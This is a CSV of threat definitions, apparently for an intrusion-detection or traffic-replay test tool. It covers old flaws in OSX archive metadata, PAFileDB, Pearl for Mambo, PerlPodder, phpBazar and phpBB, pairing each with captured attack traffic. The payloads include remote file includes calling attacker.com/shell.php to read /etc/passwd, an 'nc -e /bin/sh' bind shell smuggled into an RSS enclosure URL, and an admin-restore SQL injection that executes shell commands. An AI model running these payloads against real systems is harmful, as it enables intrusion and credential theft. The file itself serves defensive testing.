XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿osx_metadata_cmi_IPv6.xml,Apple Mac OS X Archive Metadata Command Execution Vulnerability (IPv6 Version),"This threat sends a zip file which exercises the OSX archive metadata flaw through an HTTP connection. OSX is an operating system developed by apple computer, and this threat is delivered over HTTP which typically uses port 80. (IPv6 Version)",HTTP/IPv6,TCP,GET /~phar/Secunia.mov.zip HTTP/1.0[[0D 0A ]]User-Agent: Wget/1.10.2[[0D 0A ]]Accept: */*[[0D 0A ]]Host: www.stonedcoder.org[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A]]
osx_metadata_cmi_IPv6.xml,Apple Mac OS X Archive Metadata Command Execution Vulnerability (IPv6 Version),"This threat sends a zip file which exercises the OSX archive metadata flaw through an HTTP connection. OSX is an operating system developed by apple computer, and this threat is delivered over HTTP which typically uses port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 21 Feb 2006 18:57:44 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Last-Modified: Tue, 21 Feb 2006 08:05:12 GMT[[0D 0A ]]ETag: ""352c28-221-787bde00""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 545[[0D 0A ]]Keep-Alive: timeout=15, max=100[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content-Type: application/zip[[0D 0A 0D 0A ]]PK[[03 04 14 00 00 00 08 00 A4 ]]HU4[[01 B4 01 ]]?9[[00 00 00 ]]@[[00 00 00 0B 00 15 00 ]]Secunia.movUT[[09 00 03 B4 C9 FA ]]C[[B4 C9 FA ]]CUx[[04 00 04 02 04 02 E3 D2 ]]w,([[C8 C9 ]]LN,[[C9 CC CF ]]+[[D6 ]]wN[[CC ]]I.[[CD ]]I,[[C9 ]]/[[D2 ]]K,([[D0 ]]w[[CE CF ]]+I[[CD ]]+)[[D6 F7 ]]ML[[F6 0F ]]F[[92 B5 ]]VH[[AD C8 ]],[[E1 E2 E2 02 00 ]]PK[[03 04 14 00 00 00 08 00 01 ]]<U4[[E5 ]]U[[B4 19 B4 00 00 00 8C 05 00 00 16 00 15 00 ]]__MACOSX/._Secunia.movUT[[09 00 03 E1 B3 FA ]]C[[E1 B3 FA ]]CUx[[04 00 04 02 04 02 ]]c`[[15 ]]cg`b[[C0 04 ]] 1N 6[[02 ]]b[[05 ]](?[[88 81 81 D5 0A 8B ]]Z4[[C0 08 C4 AC 1C 0C 0C ]],[[1C ]]P[[FD ]]#[[0C B0 B0 00 09 ]]U}[[C7 82 82 9C CC E4 C4 92 CC FC BC ]]b[[FD D0 92 CC 9C CC 92 CC D4 ]]b[[FD 90 D4 A2 DC CC BC C4 1C BD C4 82 02 86 ]]7o[[DE FC C7 86 1F ]]>|[[88 17 ]]?{[[F6 0C ]]/~[[F9 F2 ]]%^[[8C CB ]]^[[18 ]]~[[FF FE ]]=^[[FC F9 F3 ]]g[[BC F8 DB B7 ]]ox[[F1 8F 1F ]]?[[F0 E2 ]]?[[FE E0 C5 14 82 15 C0 08 C2 87 B5 08 ]]`f[[02 ]]x[[14 8C 02 8C ]]r0[[FE C2 1A A1 ]]C@[[96 0C A8 ]]L,-.[[CA 07 B2 B9 18 18 FE FF 07 AB E5 ]]U[[AC 01 00 ]]PK[[01 02 17 03 14 00 00 00 08 00 A4 ]]HU4[[01 B4 01 ]]?9[[00 00 00 ]]@[[00 00 00 0B 00 0D 00 00 00 00 00 01 00 00 00 E9 81 00 00 00 00 ]]Secunia.movUT[[05 00 03 B4 C9 FA ]]CUx[[00 00 ]]PK[[01 02 17 03 14 00 00 00 08 00 01 ]]<U4[[E5 ]]U[[B4 19 B4 00 00 00 8C 05 00 00 16 00 0D 00 00 00 00 00 00 00 00 00 E9 81 ]]w[[00 00 00 ]]__MACOSX/._Secunia.movUT[[05 00 03 E1 B3 FA ]]CUx[[00 00 ]]PK[[05 06 00 00 00 00 02 00 02 00 97 00 00 00 ]]t[[01 00 00 00 00]]"
﻿pafiledb_cmi.xml,PAFileDB Pafiledb_Constants.PHP Remote File Include Vulnerability,"his threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via pafiledb_constants.php ""module_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,"GET /pafiledb/includes/pafiledb_constants.php?module_root_path=http://www.attacker.com/shell.php?cmd=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
pafiledb_cmi.xml,PAFileDB Pafiledb_Constants.PHP Remote File Include Vulnerability,"his threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via pafiledb_constants.php ""module_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿pafiledb_cmi_IPv6.xml,PAFileDB Pafiledb_Constants.PHP Remote File Include Vulnerability (IPv6 Version),"his threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via pafiledb_constants.php ""module_root_path"" parameter. Foing is a web based application with typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"GET /pafiledb/includes/pafiledb_constants.php?module_root_path=http://www.attacker.com/shell.php?cmd=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
pafiledb_cmi_IPv6.xml,PAFileDB Pafiledb_Constants.PHP Remote File Include Vulnerability (IPv6 Version),"his threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via pafiledb_constants.php ""module_root_path"" parameter. Foing is a web based application with typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿pearl_for_mambo_cmi.xml,Pearl For Mambo 1.6 Remote File Include Vulnerability,"This threats sends a crafted HTTP get query containing an PHP variable override for the GlobalSettingsVariable, which allows arbitrary inclusion of executable and nonexecutable code. Pearl For Mambo is a web based application which typically listens on port 80.",HTTP,TCP,"GET /mambo%2Fincludes%2Ffunctions_cms.php%3Fphpbb_root_path%3Dhttp%3A%2F%2Fwww.attacker.com%2F HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
pearl_for_mambo_cmi.xml,Pearl For Mambo 1.6 Remote File Include Vulnerability,"This threats sends a crafted HTTP get query containing an PHP variable override for the GlobalSettingsVariable, which allows arbitrary inclusion of executable and nonexecutable code. Pearl For Mambo is a web based application which typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿pearl_for_mambo_cmi_IPv6.xml,Pearl For Mambo 1.6 Remote File Include Vulnerability (IPv6 Version),"This threats sends a crafted HTTP get query containing an PHP variable override for the GlobalSettingsVariable, which allows arbitrary inclusion of executable and nonexecutable code. Pearl For Mambo is a web based application which typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"GET /mambo%2Fincludes%2Ffunctions_cms.php%3Fphpbb_root_path%3Dhttp%3A%2F%2Fwww.attacker.com%2F HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
pearl_for_mambo_cmi_IPv6.xml,Pearl For Mambo 1.6 Remote File Include Vulnerability (IPv6 Version),"This threats sends a crafted HTTP get query containing an PHP variable override for the GlobalSettingsVariable, which allows arbitrary inclusion of executable and nonexecutable code. Pearl For Mambo is a web based application which typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿perlpodder_cmi.xml,PerlPodder Arbitrary Shell Command Execution Vulnerability,This threat exploits a failure in PerlPodder to properly sanitize user-supplied input allowing arbitrary command-execution vulnerability.,HTTP,TCP,GET /evil.xml HTTP/1.0[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: close[[0D 0A 0D 0A]]
perlpodder_cmi.xml,PerlPodder Arbitrary Shell Command Execution Vulnerability,This threat exploits a failure in PerlPodder to properly sanitize user-supplied input allowing arbitrary command-execution vulnerability.,HTTP,TCP,"<?xml version=""1.0"" encoding=""UTF-8""?>[[0D 0A ]]<?xml-stylesheet type=""text/xsl""?>[[0D 0A ]]<rss version=""2.0"">[[0D 0A ]]<channel>[[0D 0A ]]    <title>RedTeam Pentesting Example Malicious Server Feed</title>[[0D 0A 0D 0A ]]    <item>[[0D 0A ]]        <enclosure url=""http://www.example.com/example.mp3'; nc -e /bin/sh -l -p 1337 &amp; ';#'""[[0D 0A ]]         length=""241734"" type=""audio/mpeg"" />[[0D 0A ]]    </item>[[0D 0A ]]</channel>[[0D 0A ]]</rss>"
﻿perlpodder_cmi_IPv6.xml,PerlPodder Arbitrary Shell Command Execution Vulnerability (IPv6 Version),This threat exploits a failure in PerlPodder to properly sanitize user-supplied input allowing arbitrary command-execution vulnerability. (IPv6 Version),HTTP/IPv6,TCP,GET /evil.xml HTTP/1.0[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: close[[0D 0A 0D 0A]]
perlpodder_cmi_IPv6.xml,PerlPodder Arbitrary Shell Command Execution Vulnerability (IPv6 Version),This threat exploits a failure in PerlPodder to properly sanitize user-supplied input allowing arbitrary command-execution vulnerability. (IPv6 Version),HTTP/IPv6,TCP,"<?xml version=""1.0"" encoding=""UTF-8""?>[[0D 0A ]]<?xml-stylesheet type=""text/xsl""?>[[0D 0A ]]<rss version=""2.0"">[[0D 0A ]]<channel>[[0D 0A ]]    <title>RedTeam Pentesting Example Malicious Server Feed</title>[[0D 0A 0D 0A ]]    <item>[[0D 0A ]]        <enclosure url=""http://www.example.com/example.mp3'; nc -e /bin/sh -l -p 1337 &amp; ';#'""[[0D 0A ]]         length=""241734"" type=""audio/mpeg"" />[[0D 0A ]]    </item>[[0D 0A ]]</channel>[[0D 0A ]]</rss>"
﻿phpBazar_cmi.xml,phpBazar 2.1.0 Multiple Vulnerabilities,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via classified_right.php's GLOBAL parameter. phpBazar is a web based application which typically listens on port 80.,HTTP,TCP,"GET /classified_right.php%3Flanguage_dir%3Dhttp%3A%2F%2Fyourhost%2Fcmd.gif%3Fcmd%3Dls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
phpBazar_cmi.xml,phpBazar 2.1.0 Multiple Vulnerabilities,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via classified_right.php's GLOBAL parameter. phpBazar is a web based application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpBazar_cmi_IPv6.xml,phpBazar 2.1.0 Multiple Vulnerabilities (IPv6 Version),This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via classified_right.php's GLOBAL parameter. phpBazar is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /classified_right.php%3Flanguage_dir%3Dhttp%3A%2F%2Fyourhost%2Fcmd.gif%3Fcmd%3Dls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
phpBazar_cmi_IPv6.xml,phpBazar 2.1.0 Multiple Vulnerabilities (IPv6 Version),This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via classified_right.php's GLOBAL parameter. phpBazar is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpbb_cmi.xml,phpBB admin 2 exec Exploit,This threat sends a standard HTTP query which uses an SQL query to insert PHP code which is executed by the server. phpBB typically listens on port 80.,HTTP,TCP,"POST /login.php HTTP/1.1[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: IDS:r57 phpBB2 exploit a2e2#20022006|http://www.example.com/|admin|adminpassword|2|phpbb_[[0D 0A ]]Content-Length: 71[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]username=admin&password=adminpassword&autologin=on&admin=1&login=Log+in[[0D 0A 0D 0A ]]POST /admin/admin_db_utilities.php?sid= HTTP/1.1[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: IDS:r57 phpBB2 exploit a2e2#20022006|http://www.example.com/|admin|adminpassword|2|phpbb_[[0D 0A ]]Content-Length: 409[[0D 0A ]]Content-Type: multipart/form-data; boundary=xYzZY[[0D 0A 0D 0A ]]--xYzZY[[0D 0A ]]Content-Disposition: form-data; name=""perform""[[0D 0A 0D 0A ]]restore[[0D 0A ]]--xYzZY[[0D 0A ]]Content-Disposition: form-data; name=""restore_start""[[0D 0A 0D 0A ]]Start Restore[[0D 0A ]]--xYzZY[[0D 0A ]]Content-Disposition: form-data;name=""backup_file""; filename=""0wneeeeedddd""[[0D 0A ]]Content-Type: text/plain[[0D 0A 0D 0A ]]UPDATE phpbb_users SET user_sig_bbcode_uid='(.+)/e.', user_sig='blah:`echo _START_ && cat /etc/passwd && echo _END_`' WHERE user_id=2;[[0D 0A ]]--xYzZY--[[0D 0A 0D 0A 0D 0A ]]GET /profile.php?mode=editprofile&sid= HTTP/1.1[[0D 0A ]]Connection: close[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: IDS:r57 phpBB2 exploit a2e2#20022006|http://www.example.com/|admin|adminpassword|2|phpbb_[[0D 0A 0D 0A 0D 0A]]"
phpbb_cmi.xml,phpBB admin 2 exec Exploit,This threat sends a standard HTTP query which uses an SQL query to insert PHP code which is executed by the server. phpBB typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpbb_cmi_IPv6.xml,phpBB admin 2 exec Exploit (IPv6 Version),This threat sends a standard HTTP query which uses an SQL query to insert PHP code which is executed by the server. phpBB typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"POST /login.php HTTP/1.1[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: IDS:r57 phpBB2 exploit a2e2#20022006|http://www.example.com/|admin|adminpassword|2|phpbb_[[0D 0A ]]Content-Length: 71[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]username=admin&password=adminpassword&autologin=on&admin=1&login=Log+in[[0D 0A 0D 0A ]]POST /admin/admin_db_utilities.php?sid= HTTP/1.1[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: IDS:r57 phpBB2 exploit a2e2#20022006|http://www.example.com/|admin|adminpassword|2|phpbb_[[0D 0A ]]Content-Length: 409[[0D 0A ]]Content-Type: multipart/form-data; boundary=xYzZY[[0D 0A 0D 0A ]]--xYzZY[[0D 0A ]]Content-Disposition: form-data; name=""perform""[[0D 0A 0D 0A ]]restore[[0D 0A ]]--xYzZY[[0D 0A ]]Content-Disposition: form-data; name=""restore_start""[[0D 0A 0D 0A ]]Start Restore[[0D 0A ]]--xYzZY[[0D 0A ]]Content-Disposition: form-data;name=""backup_file""; filename=""0wneeeeedddd""[[0D 0A ]]Content-Type: text/plain[[0D 0A 0D 0A ]]UPDATE phpbb_users SET user_sig_bbcode_uid='(.+)/e.', user_sig='blah:`echo _START_ && cat /etc/passwd && echo _END_`' WHERE user_id=2;[[0D 0A ]]--xYzZY--[[0D 0A 0D 0A 0D 0A ]]GET /profile.php?mode=editprofile&sid= HTTP/1.1[[0D 0A ]]Connection: close[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: IDS:r57 phpBB2 exploit a2e2#20022006|http://www.example.com/|admin|adminpassword|2|phpbb_[[0D 0A 0D 0A 0D 0A]]"
phpbb_cmi_IPv6.xml,phpBB admin 2 exec Exploit (IPv6 Version),This threat sends a standard HTTP query which uses an SQL query to insert PHP code which is executed by the server. phpBB typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
